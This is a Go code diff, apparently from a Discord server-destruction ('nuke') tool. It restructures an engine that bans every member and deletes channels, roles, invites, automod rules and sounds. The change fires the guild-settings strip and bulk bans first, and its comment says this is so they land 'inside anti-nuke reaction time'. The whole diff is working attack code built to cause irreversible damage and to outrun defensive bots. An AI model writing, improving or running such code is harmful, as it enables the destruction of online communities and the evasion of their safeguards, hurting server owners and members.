@@ -68,13 +68,24 @@ func usable(e *Engine) []*token.Token {
 // nextTok picks the next usable token; nil if none.
 func (e *Engine) nextTok() *token.Token { return e.Pool.Next() }
 
-// Run fires every deletion group concurrently.
+// Run fires every deletion group concurrently. First wave = the ops with
+// independent buckets and maximum irreversible impact (guild identity strip +
+// bulk bans), submitted before the channel/role storm so they land inside
+// anti-nuke reaction time.
 func (e *Engine) Run(ctx context.Context) {
 	e.ctx = ctx
 
+	// Wave 1: guild settings PATCH is its own bucket — fire immediately.
+	go e.StripSettingsAsync(ctx)
+
+	// Wave 2: bulk bans (one request per 200 members).
+	var bwg sync.WaitGroup
+	bwg.Add(1)
+	go func() { defer bwg.Done(); e.banEveryone(ctx) }()
+
+	// Wave 3: everything else, all buckets in parallel.
 	var wg sync.WaitGroup
-	wg.Add(8)
-	go func() { defer wg.Done(); e.banEveryone(ctx) }()
+	wg.Add(7)
 	go func() { defer wg.Done(); e.deleteAutomod(ctx) }()
 	go func() { defer wg.Done(); e.deleteInvites(ctx) }()
 	go func() { defer wg.Done(); e.deleteChannels(ctx) }()
@@ -83,11 +94,17 @@ func (e *Engine) Run(ctx context.Context) {
 	go func() { defer wg.Done(); e.deleteSounds(ctx) }()
 	go func() { defer wg.Done(); e.deleteRoles(ctx) }()
 	wg.Wait()
+	bwg.Wait()
+}
 
-	e.StripSettings(ctx)
-	if e.Cfg.Short != "" {
-		e.SetShortMessage(ctx, e.Cfg.Short)
-	}
+// StripSettingsAsync runs the settings strip on the settings group.
+func (e *Engine) StripSettingsAsync(ctx context.Context) {
+	done := make(chan struct{})
+	e.Disp.Submit("settings", func() {
+		defer close(done)
+		e.StripSettings(ctx)
+	})
+	<-done
 }
 
 func (e *Engine) deleteChannels(ctx context.Context) {
